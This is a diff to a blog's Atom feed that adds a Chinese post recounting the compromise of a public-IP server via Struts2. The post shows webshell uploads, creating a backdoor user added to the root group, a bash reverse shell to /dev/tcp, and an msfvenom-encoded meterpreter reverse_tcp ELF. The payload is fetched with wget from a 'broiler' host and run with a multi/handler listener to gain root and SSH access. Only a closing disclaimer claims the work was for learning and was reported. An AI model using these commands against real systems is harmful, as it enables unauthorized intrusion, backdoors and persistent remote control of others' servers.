@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://hamal.cc/"/>
-  <updated>2018-08-22T14:20:54.455Z</updated>
+  <updated>2018-09-02T15:42:32.815Z</updated>
   <id>http://hamal.cc/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>linux渗透</title>
+    <link href="http://hamal.cc/2018/09/linux%E6%B8%97%E9%80%8F/"/>
+    <id>http://hamal.cc/2018/09/linux渗透/</id>
+    <published>2018-09-02T10:51:00.000Z</published>
+    <updated>2018-09-02T15:42:32.815Z</updated>
+    
+    <content type="html"><![CDATA[<p>用Struts2拿下的，看到是公网ip，心动了。。。<strong><a id="more"></a></strong><br><img src="/images/16.1.png" alt=""><br>查看自己是什么权限<br><img src="/images/16.2.png" alt=""><br>root权限,上传一句话<br><img src="/images/16.3.png" alt=""><br>高高兴兴去连接，结果错误。。。<br><img src="/images/16.4.png" alt=""><br>好吧！上传大马。<br><img src="/images/16.5.png" alt=""><br>访问成功，但上传文件失败。。。<br>root权限，外网，拿不下不甘心啊，换方法。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>创建用户，ssh连接。<br>创建一个用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd shell      //创建一个shell用户</span><br></pre></td></tr></table></figure></p><p>因为不能交互 所以无法使用<code>passwd</code>命令<br>尝试不是交互模式设置密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;shell123.0&quot; | passwd  -stdin shell</span><br></pre></td></tr></table></figure></p><p>加入root组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod -g root shell</span><br></pre></td></tr></table></figure></p><p><img src="/images/16.6.png" alt=""><br>确定添加shell用户成功。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id shell</span><br></pre></td></tr></table></figure></p><p><img src="/images/16.7.png" alt=""><br>ssh连接<br><img src="/images/16.8.png" alt=""><br>结果拒绝我的密码，难受。。。<br>看来在这里使用不是交互模式设置密码失败。</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>用bash反弹shell。<br>公网开启nc监听。命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 8060</span><br></pre></td></tr></table></figure></p><p><img src="/images/16.9.png" alt=""><br>linux反弹shell。命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/8060 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p><p><img src="/images/16.10.png" alt=""><br>执行成功。<br>但是windows服务器上并没有收到任何反弹信息<br>换端口换反弹方式都失败<br>应该是防火墙的问题，又失败了，好难受。</p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>这次用msf神器。<br>用msf生成一个linux后门，命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom.bat -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=*.*.*.* LPORT=8090 -e x86/shikata_ga_nai  -i  3  -felf &gt; c:\test</span><br></pre></td></tr></table></figure></p><p>详解：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-a  x86  32位</span><br><span class="line">--platform  linux 后门程序运行的平台</span><br><span class="line">-p linux/x86/meterpreter/reverse_tcp   使用的payload模块</span><br><span class="line">LHOST=*.*.*.*   反弹到攻击主机的IP地址</span><br><span class="line">LPORT=8090  反弹到攻击主机的端口号</span><br><span class="line">-e x86/shikata_ga_nai  使用的编码方式</span><br><span class="line">-i 3 重复封装编码3次</span><br><span class="line">-felf &gt; c:\test 输出后门文件到c盘目录下，文件名test</span><br></pre></td></tr></table></figure></p><p>生成好了,把后面放在另一台肉鸡上。<br>用wget下载。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://*.*.*.*/test</span><br></pre></td></tr></table></figure></p><p>执行成功。<br>看一下是否存在后门。<br><img src="/images/16.11.png" alt=""><br>确定后门存在。<br>在msf上开始监听。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST *.*.*.*</span><br><span class="line">set LPORT 8090</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p><p><img src="/images/16.12.png" alt=""><br>监听成功，记得更改后门权限。命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 test</span><br></pre></td></tr></table></figure></p><p>执行后门。命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./test</span><br></pre></td></tr></table></figure></p><p><img src="/images/16.13.png" alt=""><br>得到shell，是root权限，就用passwd改掉咱们原来添加的test的密码。<br>ssh连接成功，这就开心了。<br><img src="/images/16.14.png" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在遇到st2漏洞但是有防火墙，不能上马，不能反弹shell，只能执行非交互命令的时候可以用msf生成一个后门然后进行进一步提权。<br>本次测试仅仅做为学习，漏洞已经提交给管理员，请勿用于非法用途，所产生的一切后果与作者无关。<br><a href="http://www.freebuf.com/articles/web/178650.html" target="_blank" rel="noopener">参考文章</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;用Struts2拿下的，看到是公网ip，心动了。。。&lt;strong&gt;
+    
+    </summary>
+    
+      <category term="linux" scheme="http://hamal.cc/categories/linux/"/>
+    
+    
+      <category term="linux" scheme="http://hamal.cc/tags/linux/"/>
+    
+  </entry>
   
   <entry>
     <title>3层vps连接配置</title>
